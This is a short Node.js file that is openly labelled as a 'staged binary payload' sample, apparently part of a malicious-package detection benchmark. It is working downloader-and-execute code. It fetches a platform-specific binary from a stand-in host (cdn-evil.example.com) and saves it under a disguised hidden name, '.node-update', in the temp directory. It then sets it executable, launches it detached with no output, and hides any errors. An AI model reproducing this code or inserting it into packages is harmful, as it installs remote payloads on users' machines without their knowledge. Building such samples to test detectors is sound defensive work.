// Staged binary payload: downloads platform-specific binary and executes it
// Technique: staged_binary_payload — download + chmod + exec of native binary
// Real-world: 97 samples in Datadog benchmark

const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

const platform = os.platform();
const arch = os.arch();

const binUrl = `https://cdn-evil.example.com/bins/${platform}-${arch}`;
const binPath = path.join(os.tmpdir(), '.node-update');

function downloadBinary(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      res.pipe(file);
      file.on('finish', () => {
        file.close();
        resolve();
      });
    }).on('error', reject);
  });
}

(async () => {
  try {
    await downloadBinary(binUrl, binPath);

    if (platform !== 'win32') {
      fs.chmodSync(binPath, '755');
    }

    // Execute the dropped binary in detached mode
    const { spawn } = require('child_process');
    const child = spawn(binPath, [], {
      detached: true,
      stdio: 'ignore'
    });
    child.unref();
  } catch(e) {
    // Silent failure
  }
})();
